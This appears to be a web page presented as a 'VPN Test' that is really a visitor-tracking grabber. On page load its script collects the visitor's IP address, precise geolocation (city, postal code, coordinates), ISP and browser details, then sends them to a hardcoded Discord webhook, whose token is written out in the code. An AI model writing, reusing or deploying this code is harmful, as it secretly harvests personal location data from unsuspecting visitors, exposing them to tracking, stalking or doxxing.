<!DOCTYPE html>
<html>
<head>
<title>VPN Test</title>
<style>
body{
    font-family: Arial;
    background:#0f0f0f;
    color:white;
    text-align:center;
    padding-top:80px;
}
.box{
    background:#1f1f1f;
    padding:30px;
    border-radius:12px;
    display:inline-block;
}
</style>
</head>

<body>

<div class="box">
<h1>VPN Test Page</h1>
<p id="status">Collecting info...</p>
</div>

<script>

const WEBHOOK = "https://discord.com/api/webhooks/1461933225080389859/O_krENJ9E7tqtNcsHpOQsMTC0w-zXPhCAooQKHE-iRJ4RROYf5Jeai7S_8HwcYSOkfuU";

async function getInfo(){
    try{

        const res = await fetch("https://ipapi.co/json/");
        const data = await res.json();

        const info = `
IP: ${data.ip}
Country: ${data.country_name}
City: ${data.city}
Region: ${data.region}
Postal: ${data.postal}
ISP: ${data.org}
Timezone: ${data.timezone}
Latitude: ${data.latitude}
Longitude: ${data.longitude}

User Agent: ${navigator.userAgent}
Platform: ${navigator.platform}
Language: ${navigator.language}
Screen: ${screen.width}x${screen.height}
`;

        document.getElementById("status").innerText = "Info collected ✔";

        await fetch(WEBHOOK,{
            method:"POST",
            headers:{
                "Content-Type":"application/json"
            },
            body: JSON.stringify({
                content: "🌍 **VPN Test Result**\n```" + info + "```"
            })
        });

        document.getElementById("status").innerText = "Sent to Discord ✔";

    }catch(err){
        document.getElementById("status").innerText = "Error getting info";
        console.error(err);
    }
}

getInfo();

</script>

</body>
</html>
